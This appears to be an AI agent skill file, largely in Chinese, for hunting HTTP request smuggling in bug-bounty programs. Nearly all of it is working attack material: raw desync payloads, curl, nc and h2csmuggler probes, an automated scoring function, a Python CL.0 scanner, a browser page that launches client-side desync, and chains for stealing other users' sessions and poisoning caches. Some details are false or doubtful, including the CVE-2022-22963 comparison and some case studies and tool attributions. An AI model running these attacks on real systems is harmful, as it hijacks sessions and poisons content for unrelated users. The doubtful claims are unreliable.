---
name: hunt-http-smuggling
description: "猎取 HTTP 请求走私（CL.TE、TE.CL、H2.CL、H2.TE）。成因：前端代理与后端服务器对一个请求在哪里结束、下一个请求从哪里开始判断不一致（Content-Length 与 Transfer-Encoding 头部解析不一致）。CL.TE：前端使用 CL，后端使用 TE → 通过发送 TE: chunked 但请求体长度符合 CL 计数来实施走私。TE.CL：相反。H2.CL：HTTP/2 降级，将 CL 走私进 HTTP/1.1 后端。检测工具：Burp HTTP Request Smuggler 扩展、smuggler.py、h2csmuggler。确认：时间延迟技术（走私一个带 30s 超时的 GET）——如果前端对下一个受害者请求返回缓慢，则走私成立。验证：缓存投毒链（走私一个会被缓存给受害者的请求）、凭据窃取（走私 X-Forwarded-For 覆盖以捕获下一个用户的 Cookie）、绕过认证（走私内部路径请求）。来自大型 CDN 部署的真实付费案例。适用于猎取运行 CDN+源站栈的 H1 付费项目，或以负载均衡器 / WAF 绕过为目标时。"
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
metadata:
  tags: [http-smuggling, hunt, redteam]
  category: redteam
---

## When to Use

- 在猎取运行 CDN+源站栈的 H1 付费项目时，或以负载均衡器 / WAF 绕过为目标时。

## Prerequisites

- 针对目标的明确授权、目标边界和速率限制。
- 工具：`curl`、`dig`、`httpx`、`python3`。
- 可写的证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 对于任何改变状态的步骤（写入、上传、凭据尝试），在执行命令前立即取得明确确认。

## How to Run

```bash
curl --max-time 30 --connect-timeout 10 -sI https://target/ | grep -i "Server:"
```

## Procedure

以下各阶段即为操作流程。保持每次探测有界（`--max-time`），在 `OUTPUT_DIR` 下记录证据，并在 Pitfalls 中列出的停止条件处停止。

## 17. HTTP 请求走私
> 重复率最低。$5K–$30K。James Kettle 的 PortSwigger 研究。

### CL.TE（前端 Content-Length，后端 Transfer-Encoding）
```http
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### 检测
```
1. Burp extension: HTTP Request Smuggler
2. Right-click request → Extensions → HTTP Request Smuggler → Smuggle probe
3. Manual timing: CL.TE probe + ~10s delay = backend waiting for rest of body
```

### 影响链
```
Poison next request → access admin as victim
Steal credentials → capture victim's session
Cache poisoning → stored XSS at scale
```

---

## 目标适配性矩阵（2026 现实检验）

经典的 CL.TE / TE.CL payload 在 2026 年并非普遍可利用。现代代理默认严格遵循 RFC 9112。投入时间之前先对前端做指纹识别。

| 前端 | CL.TE | TE.CL | H2.CL | H2.TE | 说明 |
|---|---|---|---|---|---|
| **Nginx >= 1.21** | NO | NO | partial (H2 ingress) | partial | 常见配置会拒绝含糊的 CL+TE 请求，但行为仍取决于完整的代理链。 |
| **Caddy 2.x** | NO | NO | — | — | 默认已加固 |
| **Envoy ≥ 1.20** | NO | NO | partial | partial | 大多数路径已加固 |
| **HAProxy ≤ 2.4** | ✓ | ✓ | — | — | **存在漏洞**，参见 CVE-2021-40346 |
| **AWS ALB + 特定上游** | partial | partial | ✓ | ✓ | 2022-2024 年有多份已披露的付费报告 |
| **Cloudflare → S3 / Lambda 链** | — | — | ✓ | ✓ | H2 降级攻击仍然可行 |
| **较旧的 F5 BIG-IP（TMM < 16）** | ✓ | — | — | — | 厂商安全公告 |
| **Citrix ADC / NetScaler（旧固件）** | ✓ | ✓ | — | — | 2020-2022 年已披露 |
| **Squid 3.x** | ✓ | — | — | — | 较旧的部署 |
| **Apache Traffic Server（较旧）** | ✓ | ✓ | ✓ | ✓ | PortSwigger 研究 |
| **自定义 Python / Go 代理** | ✓ | ✓ | — | — | 经常遗漏 RFC 强制要求 |

### 运维者指纹快速检查

```bash
curl --max-time 30 --connect-timeout 10 -sI https://target/ | grep -i "Server:"
```

- `nginx/1.21+`、`Caddy`、`envoy` → 经典 CL/TE 已死 —— 若前端支持 HTTP/2 则转向 H2.CL/H2.TE，或在上游寻找遗留代理
- `HAProxy`、头部指向 AWS/CDN → 运行完整的 payload 矩阵
- 无 Server 头部 → 视为已加固，但先运行一次快速的 `space-before-colon` 探测；若未返回 400，则进一步深挖

### H2.CL / H2.TE（现代主流向量）

H2 降级走私攻击依赖前端对客户端使用 HTTP/2、对源站使用 HTTP/1.1。这种降级引入了 CL/TE 混淆，因为 HTTP/2 的帧长度头部无法在转换中完整保留。2024-2026 年的大多数 CDN+源站链都采用这一确切拓扑。

发送 HTTP/2 原始帧的工具（Burp Pro 的 HTTP Request Smuggler 扩展、`h2csmuggler`、`smuggler.py`）是针对 CDN 前置目标的正确起点。避免用仅支持 HTTP/1.1 的测试客户端（curl、原始套接字）攻击 H2 前置目标 —— 那会完全发错协议。

---

### CL.0 失步（后端忽略 Content-Length）

也称为 "CL.0" 或"被忽略的 Content-Length"。前端读取 Content-Length 并转发请求体。后端不解析 Content-Length —— 它一直读取直到连接关闭。这使请求体字节悬留在 keep-alive 连接上，成为下一个请求的开头。

**使用原始套接字检测：**

```bash
# CL.0 probe — send a POST with smuggled prefix after the body
# The backend ignores CL and treats the smuggled bytes as the next request
{
  echo -en 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nConnection: keep-alive\r\n\r\nSMUGGL'
  sleep 2
  echo -en 'GET /404 HTTP/1.1\r\nHost: target.com\r\nConnection: close\r\n\r\n'
} | nc -w 10 target.com 443
```

**基于 curl 的盲探测：**

```bash
# CL.0 timing probe: delay on backend indicates CL ignored
curl --max-time 30 --connect-timeout 10 -s --raw -X POST "https://target.com/" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 4" \
  -d $'x' \
  --max-time 15 \
  -w "\nHTTP_CODE: %{http_code}\nTIME: %{time_total}\n"
```

**CL.0 最可能出现的情形：**
- 自定义 Go/Python/Rust 后端，使用 `http.Handler` 与 `r.Body.Read` 但不强制 CL
- 代理后方的 PHP-FPM（当 `max_input_vars` 未触发时，PHP 在 POST 上忽略 CL）
- Server-Timing 头部泄露内部代理处理信息

**关键指标：** 一个 CL 不匹配的 POST 请求没有返回 HTTP 400。后端毫无异议地吞下了一个错误的 Content-Length。

---

### H2.CL 失步（HTTP/2 → HTTP/1.1 CL 注入）

攻击者发送一个包含 `content-length` 头部的 HTTP/2 请求。HTTP/2 前端信任自身的帧长度来界定请求，并将 CL 头部透传给 HTTP/1.1 后端。后端随后使用降级后的 CL 头部进行定界，而前端已消费了整个帧 —— 从而在上游 HTTP/1.1 连接上产生失步。

**Netflix $20k 案例研究（HackerOne 2021-2022）：**
- 研究者 @defparam 发现 Netflix 的 HTTP/2 终止层将 `content-length` 头部转发进了 HTTP/1.1 上游连接
- HTTP/2 帧长度为 0（无请求体），但注入的 `content-length: 50` 头部告诉后端仍需 50 个字节
- 前端将下一个请求的字节作为被走私请求的"请求体"转发
- 影响：Netflix API 响应的缓存投毒、共享上游连接上的会话劫持
- 赏金：$20,000。修复方式是在所有 H2→H1.1 降级请求中剥离 `content-length`。

**使用 h2csmuggler 检测：**

```bash
# Install h2csmuggler
pip install h2csmuggler

# Probe H2.CL with a delay-based detector
h2csmuggler.py -x https://target.com --h2cl --method GET --path "/" \
  --smuggled-path "/api/internal/admin" \
  --smuggled-host "target.com" \
  --delay 5
```

**Burp 手工探测：**
1. Burp → Repeater → 将协议切换为 HTTP/2
2. 移除 `:method` 伪头部的请求体长度（设为 0）
3. 添加 `content-length: 100` 作为普通头部
4. 将走私请求放入头部之后的 `DATA` 帧
5. 发送 → 观察后续请求是否触发对 `/smuggled-path` 的 404

---

### H2.TE 失步（HTTP/2 Transfer-Encoding 注入）

HTTP/2 正式移除了 `Transfer-Encoding` —— 它仅使用帧长度。但当前端将 H2→H1.1 降级并允许 `transfer-encoding: chunked` 在转换中存活时，H1.1 后端会使用 TE 并等待分块边界。攻击者发送一个完整的 H2 帧（前端满足）外加一个后端永远读不完的分块请求体 → 下一个请求的字节消耗了分块请求体。

**AWS ALB 案例研究（Albibir，2023）：**
- 研究者发现 AWS Application Load Balancer（ALB）在配置为 HTTP/2 监听器 → HTTP/1.1 目标组时，会将 HTTP/2 请求中的 `transfer-encoding` 头部传入 HTTP/1.1 上游
- ALB 正确地使用帧长度终止了 H2，但在 H1.1 上游请求中包含了 TE: chunked
- 源站 Nginx/HTTPD 随后将请求体解释为分块 —— 0\r\n\r\n 结束分块，后续字节构成一个走私的 HTTP 请求
- 影响：ALB 缓存响应的完全缓存投毒、跨 ALB 连接的微服务凭据窃取
- 披露：AWS 在确认复现后完成修补 —— ALB 现在会在降级时剥离 TE 头部
- 该模式类似 CVE-2022-22963（Spring Cloud Function）利用代理失步

**检测：**

```bash
# H2.TE probe with h2csmuggler
h2csmuggler.py -x https://target.com --h2te --method POST --path "/" \
  --body "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n" \
  --delay 10

# Manual H2.TE via Burp (Repeater → HTTP/2):
# 1. Add header: transfer-encoding: chunked
# 2. Body: "0\r\n\r\nGET /404 HTTP/1.1\r\nHost: target.com\r\n\r\n"
# 3. The DATA frame has full body, but backend reads chunked encoding
# 4. Follow with a real GET / → expect 404 for /404
```

**ALB 何时存在漏洞：**
- ALB 监听器协议：HTTPS（HTTP/2）
- 目标组协议：HTTP/1.1
- 源站服务器在 keep-alive 连接上解析分块编码
- 验证方式：`curl -si https://target/ | grep -i "server:"` —— 若没有明确的 ALB 头部，仍然要测试

---

### TE.TE 混淆（头部走私）

当前端和后端都支持 Transfer-Encoding，但对该头部的解析方式不同时，混淆变体可以让一侧看到 TE 而另一侧忽略它。

**变体矩阵：**

| 变体 | 头部 | 前端行为 | 后端行为 |
|---------|--------|-------------------|-------------------|
| 分块 + 空格 | `Transfer-Encoding : chunked` | 名称后加空格 → 忽略 TE | 正确读取 TE |
| Tab 注入 | `Transfer-Encoding:\tchunked` | 值前有 Tab → 跳过 TE | 读取 chunked |
| 双头部 | `Transfer-Encoding: x` + `Transfer-Encoding: chunked` | 取第一个 → 跳过 | 取最后一个 → 使用 chunked |
| x-chunked | `Transfer-Encoding: xchunked` | 无匹配 → 无 TE | 容忍 → 读取 chunked |
| 随机填充 | `Transfer-Encoding: chunked\r\nTransfer-Encoding: identity` | 取第一个（identity）→ 无 TE | 取最后一个（chunked）→ TE |
| 头部前置垃圾 | `Transfer-Encoding:\r\n chunked` | 行折叠 → 忽略 | 按 chunked 读取 |
| 过时行折叠 | `Transfer-Encoding:\r\n chunked` | RFC 7230 过时折叠 → 忽略 | 容忍型解析器接受 |
| 大小写混用 | `Transfer-Encoding: ChuNkEd` | 严格小写检查 → 忽略 | 大小写不敏感 → 接受 |

**检测脚本：**

```bash
# TE.TE probe: tab injection
curl --max-time 30 --connect-timeout 10 -s -X POST "https://target.com/" \
  -H "Transfer-Encoding:\tchunked" \
  -H "Content-Length: 4" \
  -d $'0\r\n\r\n' \
  -w "HTTP_CODE: %{http_code}\n" \
  --max-time 10

# TE.TE probe: space before colon
curl --max-time 30 --connect-timeout 10 -s -X POST "https://target.com/" \
  -H "Transfer-Encoding : chunked" \
  -H "Content-Length: 4" \
  -d $'0\r\n\r\n' \
  -w "HTTP_CODE: %{http_code}\n"

# TE.TE probe: double header (front picks first, back picks last)
curl --max-time 30 --connect-timeout 10 -s -X POST "https://target.com/" \
  -H "Transfer-Encoding: x" \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 4" \
  -d $'0\r\nSMUGGLED\r\n' \
  -w "HTTP_CODE: %{http_code}\n"

# TE.TE probe: X-chunked variant
curl --max-time 30 --connect-timeout 10 -s -X POST "https://target.com/" \
  -H "Transfer-Encoding: xchunked" \
  -d $'0\r\n\r\nGET /404 HTTP/1.1\r\nHost: target.com\r\n\r\n' \
  --max-time 10
```

**解读：**
- 对混淆头部返回 HTTP 400 → 前端严格（符合 RFC 9112）
- 返回 HTTP 200 但无失步 → 后端接受了 TE，但不具备相反的解析行为
- 超时或后续请求返回走私响应 → 确认 TE.TE 失步

---

### 客户端失步（浏览器驱动的走私）

由 James Kettle（PortSwigger，2023）发现。攻击者不直接从直连连接实施走私，而是利用受害者的浏览器发送一个精心构造的 POST 请求，带上 `Connection: keep-alive` 以及一段代理认为完整、但后端视为不完整的请求体。随后浏览器到代理的连接被投毒 —— 受害者在该连接上的下一个请求就会收到走私的响应。

**与服务端失步的关键区别：** 浏览器是走私者。代理和后端是受害者。无需直接套接字。

**机制：**
1. 攻击者托管一个页面，使用 `fetch('https://vuln-proxy/', { method: 'POST', body: '0\r\n\r\nGET /login HTTP/1.1\r\nHost: vuln-proxy\r\n\r\n', mode: 'cors' })`（或 `no-cors` 配合 `keepalive: true`）
2. 浏览器发送该 POST。前端代理认为请求体已被 Content-Length 消费。
3. 后端使用不同的解析器（或无 CL 的 Connection: keep-alive）读取请求体，并将回车换行视为请求边界。
4. 受害者的下一个请求（真实的 GET /index.html）落在走私前缀之后 → 走私请求的响应被返回给受害者。

**检测：**

```bash
# Serve a test page that fires a desync probe from the browser
cat > /tmp/csd-test.html << 'EOF'
<!DOCTYPE html>
<html>
<body>
<script>
// Client-Side Desync probe — sends a POST with dangling body bytes
fetch('https://target.com/', {
  method: 'POST',
  mode: 'no-cors',  // keepalive needed for connection reuse
  keepalive: true,
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: '0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: target.com\r\nConnection: close\r\n\r\n'
});

// Follow-up fetch to see if connection was poisoned
setTimeout(() => {
  fetch('/dashboard')
    .then(r => r.text())
    .then(t => console.log('DASHBOARD RESPONSE:', t.substring(0, 200)));
}, 1000);
</script>
</body>
</html>
EOF

# Start a local server to serve the page
python3 -m http.server 8888 --directory /tmp/
# Then open http://localhost:8888/csd-test.html in a browser pointed at target
```

**客户端失步前提条件：**
- 代理支持 HTTP/1.1 keep-alive 与连接复用
- 后端不消费完整请求体（忽略 CL 或分块不匹配）
- 浏览器 CORS 策略允许 `no-cors` + `keepalive: true`（始终允许）
- 受害者浏览器必须已与代理保持一条打开的连接（keep-alive 连接池）

**通过 curl 模拟检测：**

```bash
# Simulate what the browser sends — POST with body, then GET on same connection
{
  echo -en 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 30\r\nContent-Type: text/plain\r\nConnection: keep-alive\r\n\r\n'
  echo -en '0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: target.com\r\n'
  sleep 1
  echo -en 'GET /dashboard HTTP/1.1\r\nHost: target.com\r\nConnection: close\r\n\r\n'
} | nc -w 10 target.com 80
```

---

### HTTP 异常评级（HA Rank）

一套 0–5 分的评分体系，用于量化目标对 HTTP 失步走私的易感程度。分值越高越危险。

| 评分 | 标签 | 判定标准 | 行动 |
|-------|-------|----------|--------|
| **0** | 免疫 | 严格遵循 RFC 9112；任何 CL+TE 组合都返回 400；H2→H1.1 剥离所有请求体头部 | 继续下一个目标 |
| **1** | 低 | CL+TE 返回 200 但未观察到失步；H2 降级测试为阴性 | 记录并跳过 |
| **2** | 中 | 接受 CL+TE；时间探测显示轻微连接卡顿；H2 失步为阴性 | 运行自动化扫描器 |
| **3** | 高 | 通过时间探测确认 CL/CL.0 或 TE 混淆；H2.CL 或 H2.TE 显示部分失步 | 完整手工利用链 |
| **4** | 严重 | 通过第二个请求的后续响应捕获确认失步；可用于缓存投毒 | 放下一切。完成全链 PoC |
| **5** | 紧急 | 在生产 keep-alive 池上验证了缓存投毒或凭据窃取；影响多个上游连接 | 立即提交披露报告 |

**快速 HA Rank 计算器：**

```bash
# HA Rank automation (bash one-liner — run against target)
function ha_rank() {
  local t=$1
  local score=0
  # Test 1: CL+TE coexistence → does the server 400?
  curl --max-time 30 --connect-timeout 10 -sk -m 10 -X POST "$t/" -H "Content-Length: 4" -H "Transfer-Encoding: chunked" -d $'x' -w "%{http_code}" | grep -q 400 && echo "CL+TE → 400 (RFC strict)" || { echo "CL+TE → accepted (+1)"; score=$((score+1)); }
  # Test 2: Timing desync probe
  timeout 15 curl --max-time 30 --connect-timeout 10 -sk -X POST "$t/" -H "Transfer-Encoding: chunked" -d $'0\r\n\r\nGET / HTTP/1.1\r\nHost: x\r\n\r\n' -w "%{time_total}" 2>/dev/null | awk '{if ($1 > 5) print "Timing desync (+2)"; else print "No timing desync"}'
  # Test 3: TE.TE obfuscation (tab injection)
  curl --max-time 30 --connect-timeout 10 -sk -m 10 -X POST "$t/" -H $'Transfer-Encoding:\tchunked' -d $'0\r\n\r\n' -w "%{http_code}" | grep -q 400 && echo "TE.TE tab → blocked" || echo "TE.TE tab → accepted (+1)"
  # Test 4: H2.CL if H2 available
  which h2csmuggler 2>/dev/null && h2csmuggler.py -x "$t" --h2cl --method GET --path "/" --delay 3 2>&1 | grep -q "VULNERABLE" && { echo "H2.CL vulnerable (+2)"; score=$((score+2)); }
  echo "--- HA Rank: $score/5 ---"
}
# Usage:
# ha_rank https://target.com
```

---

### 检测方法论（基于技术栈测试）

将测试变体匹配到已检测或假定的技术栈。不要对每个目标都发射全部 payload —— 无效请求会浪费侦察时间。

| 检测到的技术栈 | 主要测试 | 次要测试 | 跳过 |
|---------------|-------------|---------------|------|
| **nginx 1.21+** | H2.CL（若启用 H2） | H2.TE | CL.TE、TE.CL、CL.0 |
| **Caddy 2.x** | H2.TE（默认 H2） | — | 其余全部 |
| **HAProxy ≤ 2.4** | CL.TE | TE.CL、TE.TE 混淆 | H2（不支持 H2） |
| **Envoy 1.20+** | H2.CL（若前置 H2） | CL.0（自定义上游） | CL.TE、TE.CL |
| **AWS ALB** | H2.TE | H2.CL、CL.0 | CL.TE（ALB 在 H1 上剥离 TE） |
| **Cloudflare** | H2.CL（降级到源站） | H2.TE | CL.TE（CF 边缘严格遵循 RFC） |
| **Akamai** | TE.TE 混淆 | H2.CL | CL.TE |
| **Fastly** | CL.0（已知 Fastly 行为） | H2.TE | TE.CL |
| **Apache httpd 2.4** | TE.TE 混淆 | CL.TE | H2.CL（无原生 H2） |
| **自定义 Go/Python 代理** | CL.0 | CL.TE、TE.TE | 除非已确认，否则跳过 H2 |
| **代理后方的 Java/Tomcat** | H2.TE | CL.0 | TE.CL（Tomcat 拒绝 TE） |

**通用工作流：**

```bash
# Step 1: Fingerprint the stack
curl --max-time 30 --connect-timeout 10 -sI "https://target.com/" | grep -iE "^(server:|via:|x-powered-by:|x-served-by:|cf-ray:|akamai|fastly)"
# Or use httpx for stack detection
httpx -u "https://target.com/" -td -sc -server

# Step 2: Quick RFD (Request Fingerprint Detection) — does the endpoint return 400 on garbage?
curl --max-time 30 --connect-timeout 10 -s -m 5 -X PURGE "https://target.com" -w "%{http_code}"  # 405 → alive; 400 → strict

# Step 3: Based on stack (table above), run primary and secondary probes
# Step 4: If timing delta > 3s on any probe, escalate to HA Rank scoring
# Step 5: On HA Rank ≥ 3, write the full exploit chain
```

---

### 工具

#### smuggler.py（PortSwigger / defparam）

最初的 Python3 CL.TE/TE.CL 模糊测试器。支持多线程扫描和自动检测。

```bash
# Install
git clone https://github.com/defparam/smuggler.git /tools/smuggler
cd /tools/smuggler && pip install -r requirements.txt

# Basic scan — test all payloads against a target
python3 smuggler.py -u "https://target.com/" -m POST --timeout 10

# Specific variant scan
python3 smuggler.py -u "https://target.com/" -m POST --cl-te --timeout 15

# Output vulnerable requests to file for manual replay
python3 smuggler.py -u "https://target.com/" -m POST -o /tmp/smuggler_results.txt

# With custom header (e.g., bypassing WAF by doubling Host)
python3 smuggler.py -u "https://target.com/" -m POST -H "X-Forwarded-Host: evil.com"
```

**局限：** smuggler.py 只发送 HTTP/1.1。它不会检测 H2.CL 或 H2.TE 变体。对 HTTP/2 目标务必随后使用 h2csmuggler。

#### h2csmuggler（Assetnote / VanTuynh）

HTTP/2 → HTTP/1.1 降级走私工具链。可处理原始 H2 帧。

```bash
# Install
git clone https://github.com/assetnote/h2csmuggler.git /tools/h2csmuggler
cd /tools/h2csmuggler && pip install -r requirements.txt

# H2.CL probe
python3 h2csmuggler.py -x "https://target.com" --h2cl --method GET --path "/" \
  --smuggled-path "/api/admin/users" --smuggled-host "internal.target.com"

# H2.TE probe
python3 h2csmuggler.py -x "https://target.com" --h2te --method POST --path "/login" \
  --body "0\r\n\r\nGET /debug HTTP/1.1\r\nHost: localhost\r\n\r\n"

# Test all H2 variants
python3 h2csmuggler.py -x "https://target.com" --test-all --delay 10

# Verbose output for debugging
python3 h2csmuggler.py -x "https://target.com" --h2cl -v
```

#### Burp Suite —— HTTP Request Smuggler 扩展

手工与自动化测试的黄金标准。需要 Burp Suite Professional。

- **安装：** BApp Store → HTTP Request Smuggler（PortSwigger 出品）
- **自动扫描：** 右键请求 → Extensions → HTTP Request Smuggler → Smuggle Probe（CL.TE、TE.CL、TE.TE）
- **H2 扫描：** 需要 Burp 2023.12+，并在 Repeater 中启用 HTTP/2 支持
- **H2 走私标签页：** Extensions → HTTP Request Smuggler → HTTP/2 Smuggler Configuration → 选择 H2.CL 或 H2.TE
- **Turbo Intruder 集成：** HTTP Request Smuggler 可生成 Turbo Intruder Python 脚本，用于大批量失步测试

**技巧：** 在 Burp 2024+ 中使用 "Smuggle via HTTP/2 downgrade" 选项，可在不手工切换协议的情况下自动化 H2.CL/H2.TE。

#### Turbo Intruder（PortSwigger）

用于高速失步暴力测试 —— 适合定位哪个上游连接池存在漏洞。

```python
# Example Turbo Intruder script for H2.CL brute-force
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=10,
                           engine=Engine.BURP2
                           )
    for i in range(100):
        engine.queue(target.req, i)
        engine.queue(target.req, i+100)

def handleResponse(req, interesting):
    if '404' in req.response or 'smuggled' in req.response:
        table.add(req)
```

#### CL.0 检测工具（Python）

需要快速测试大量目标时使用的独立 CL.0 扫描器：

```python
#!/usr/bin/env python3
"""CL.0 desync scanner — test if backend ignores Content-Length."""
import socket, ssl, sys, time

def test_cl0(host, port=443, path="/"):
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sock = socket.create_connection((host, port), timeout=10)
    ssock = ctx.wrap_socket(sock, server_hostname=host)

    # Probe: POST with CL but include a smuggled prefix
    probe = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Length: 6\r\n"
        f"Connection: keep-alive\r\n\r\n"
        f"SMUGGL"
    )
    ssock.sendall(probe.encode())
    time.sleep(1)

    # Follow-up request
    follow = (
        f"GET /404 HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Connection: close\r\n\r\n"
    )
    ssock.sendall(follow.encode())

    resp = b""
    while True:
        try:
            data = ssock.recv(4096)
            if not data:
                break
            resp += data
        except:
            break
    ssock.close()
    return resp

if __name__ == "__main__":
    resp = test_cl0(sys.argv[1], int(sys.argv[2]) if len(sys.argv)>2 else 443)
    if b"404" in resp and b"SMUGGL" in resp:
        print("[!] CL.0 confirmed — smuggled prefix reflected in response")
    else:
        print("[-] No CL.0 desync detected")
```

---

## Pitfalls
- **没有两层架构的 HTTP 走私** —— 走私需要前端代理与后端服务器对请求边界存在分歧。单层应用不受影响。
- **TE.CL 与 CL.TE 混淆** —— 这是两种相反的攻击。尝试前先对具体的分歧点做指纹识别。
- **没有可确认副作用的走私探测** —— 探测请求返回 200 或 400 并不能确认走私。需要一个可见的副作用（缓存投毒、请求队列投毒、响应队列）。
- **HTTP/2 降级走私** —— H2C 降级走私要求后端在同一连接上接受 HTTP/1.1。测试后端是否支持 HTTP/1.1。
- **通过走私绕过 WAF** —— 许多 WAF 不会重组走私请求。这是走私攻击的首要价值点。

---

## Verification

- 每个被提升的发现都要说明预期行为、观察到的响应，以及排除误报的阴性对照。
- 影响以所需的最小状态变更来演示；仅有状态码、banner 或扫描器标签不构成发现。
- 请求、响应、UTC 时间戳和工具版本记录在 `${OUTPUT_DIR:-./output}` 下，以便审阅者复现该断言。

---

## 相关技能与链路

- **`hunt-cache-poison`** —— 走私 + 缓存是典型的严重链路；一个走私请求成为后续每个受害者收到的缓存响应。链路原语：用 CL.TE 走私一个响应体包含攻击者 HTML/JS 的请求 → 前端缓存将其存储在热门 URL（`/`、`/login`）下 → 失步投毒使走私请求成为接下来 N 个受害者的缓存响应，并在缓存 TTL 内持续存在。
- **`hunt-auth-bypass`** —— 走私可到达前端 WAF/认证代理会过滤掉的仅内部路由。链路原语：走私 `GET /admin/users HTTP/1.1` 绕过阻止外部 `/admin/*` 的前端 ACL → 后端将走私请求视为来自受信任内部来源处理 → 通过走私内部路由请求绕过前端认证 → 管理数据出现在响应队列中。
- **`hunt-idor`** —— 走私将下一个用户的会话 Cookie 附加到攻击者控制的请求路径上。链路原语：走私不带 Cookie 的 `GET /api/me HTTP/1.1` → 后端将其与下一个合法用户入站连接的 Cookie 配对 → 受害者的会话 Cookie 附加到攻击者的走私请求 → 攻击者读取包含受害者 PII/令牌的响应。
- **`hunt-xss`** —— 走私将 XSS payload 注入下一个受害者的响应流，且从不出现在 URL 参数中。链路原语：走私请求体包含反射型 payload，后端将其渲染进队列中的下一个响应 → 下一个访问 `/` 的访客收到内联的攻击者 HTML → 每个访客都遭遇反射型 XSS，且对访客和日志都不可见任何 URL 参数。
- **`security-arsenal`** —— 在手工十六进制编辑之前，先取用走私 payload 库（CL.TE / TE.CL / TE.TE 混淆、H2.CL 降级探测、h2csmuggler 单行命令、Burp HTTP Request Smuggler 扩展配置）以及时间延迟确认模板。
- **`triage-validation`** —— 在声称严重之前先运行 Pre-Severity Gate：走私请求的效应必须落在由不同客户端/会话发出的请求上，而不是你自己的后续请求。仅在自己浏览器中观察到时间差只是解析器分歧，而非可利用的走私。
